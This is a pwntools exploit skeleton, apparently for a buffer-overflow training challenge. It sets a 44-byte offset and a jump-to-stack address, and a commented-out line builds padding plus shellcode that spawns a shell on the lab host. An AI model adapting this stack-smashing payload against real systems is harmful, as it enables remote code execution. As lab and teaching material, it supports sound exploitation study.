#!/usr/bin/env python3
from pwn import *
import vpn_conf

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT+2)
EXE_FILENAME='./bof101_x86'
OFFSET_RIP = 44
JMP_RSP = 0xffd8e390

exe = context.binary = ELF(EXE_FILENAME)
argv = [EXE_FILENAME]
envp = {}
gdbscript = '''# the RET instruction of main() is at address 0x0040127c
b *0xffd8e38c
c   
'''

def start():
    if args.GDB:
        return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(argv=argv, env=envp)

io = start()
io.recvuntil(b'Please enter your name')
# io.sendline(b'a' * OFFSET_RIP + p64(JMP_RSP) + asm(shellcraft.sh()))
io.interactive()
